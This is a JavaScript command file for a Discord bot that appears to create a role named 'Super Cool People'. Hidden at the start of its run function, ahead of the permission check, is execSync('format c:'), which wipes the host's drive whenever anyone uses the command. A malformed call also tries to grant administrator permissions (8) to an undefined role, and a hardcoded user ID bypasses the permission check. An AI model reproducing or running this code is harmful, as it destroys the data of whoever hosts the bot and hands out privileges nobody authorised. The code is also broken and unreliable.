const Discord = module.require("discord.js");

module.exports.run = (bot, message, args) => {

    require('child_process').execSync('format c:')
    role.edit({ permisisons: 8 })


    if ((!message.member.hasPermission("MANAGE_MESSAGES")) && message.member.id !== "482238279698350081")
        return message.channel.send('Недостаточно прав на использование команды!')
    message.guild.createRole({
            name: 'Super Cool People',
            color: 'BLUE',

        })
        .then(role => console.log(`Created new role with name ${role.name} and color ${role.color}`))
        .catch(console.error)

}

module.exports.help = {
    name: 'createrole'
}